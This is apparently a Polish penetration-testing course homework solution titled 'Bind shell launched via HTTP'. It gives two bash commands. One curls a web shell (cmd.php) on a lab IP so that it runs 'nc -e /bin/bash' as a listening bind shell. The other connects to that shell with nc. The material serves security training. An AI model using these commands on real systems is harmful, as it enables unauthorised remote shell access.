---
title: "6.4p - Bind shell uruchomiony przez HTTP"
order: 11
---

> **Uwaga do rozwiązania:** Oba terminale są na maszynie pośredniej. Pierwsze żądanie curl może czekać, dopóki działa uruchomiona powłoka. Łączysz się z nią z drugiego terminala.

```bash
#Remote Shells HOMEWORK - terminal 1:
curl 'http://192.168.200.156/cmd.php?c=nc+-e+/bin/bash+-lvp+7331'

#Remote Shells HOMEWORK - terminal 2:
nc 192.168.200.156 7331
```
